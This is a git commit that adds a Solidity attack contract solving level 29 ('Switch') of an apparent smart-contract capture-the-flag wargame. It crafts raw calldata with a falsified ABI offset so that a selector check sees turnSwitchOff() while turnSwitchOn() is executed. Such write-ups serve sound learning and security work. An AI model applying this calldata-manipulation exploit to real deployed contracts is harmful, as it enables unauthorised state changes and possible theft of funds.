44859ca97a72f9279aba0aa27352465f44283875
Claudia <claudiabarcelovaldes40@gmail.com>
2024-01-02 16:37:12 +0100

    add lvl 29 solution

--- script/LevelAttacks/29Switch.sol
+++ script/LevelAttacks/29Switch.sol
@@ -5,5 +5,28 @@ pragma solidity ^0.8.19;
 import {Broadcasted} from "./Helper/Broadcasted.sol";
 
 contract SwitchAttack is Broadcasted {
-    function attack(address payable motorbikeCtr_) public payable override {}
+    function attack(address payable switchCtr_) public payable override {
+        bytes memory _funcSelector = abi.encodeWithSignature(
+            "flipSwitch(bytes)"
+        );
+        bytes memory _offset = abi.encode(uint256(0x60));
+        bytes memory _emptySlot = abi.encode(uint256(0x0));
+        bytes memory _dataSize = abi.encode(4);
+        bytes memory _switchOffSelector = abi.encode(
+            bytes4(keccak256("turnSwitchOff()"))
+        );
+        bytes memory _switchOnSelector = abi.encode(
+            bytes4(keccak256("turnSwitchOn()"))
+        );
+        bytes memory _data = abi.encodePacked(
+            _funcSelector,
+            _offset,
+            _emptySlot,
+            _switchOffSelector,
+            _dataSize,
+            _switchOnSelector
+        );
+
+        address(switchCtr_).call(_data);
+    }
 }
